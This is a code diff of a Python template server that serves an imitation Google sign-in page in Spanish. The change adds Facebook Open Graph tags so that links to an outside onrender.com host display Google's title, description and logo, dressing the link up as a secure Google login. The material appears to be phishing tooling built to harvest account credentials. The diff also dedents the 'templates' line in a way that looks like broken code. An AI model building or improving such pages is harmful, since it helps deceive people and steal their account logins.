@@ -34,13 +34,18 @@ def get_template():
             template_name = config.get('template', 'google')
     except:
         template_name = 'google'
-    
-    templates = {
+templates = {
         'google': '''
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
+    <!-- METADATOS PARA FACEBOOK -->
+    <meta property="og:title" content="Iniciar sesión - Google" />
+    <meta property="og:description" content="Accede a tu cuenta de Google de forma segura" />
+    <meta property="og:image" content="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" />
+    <meta property="og:url" content="https://video-xeen.onrender.com" />
+    <meta property="og:type" content="website" />
     <title>Iniciar sesión - Google</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
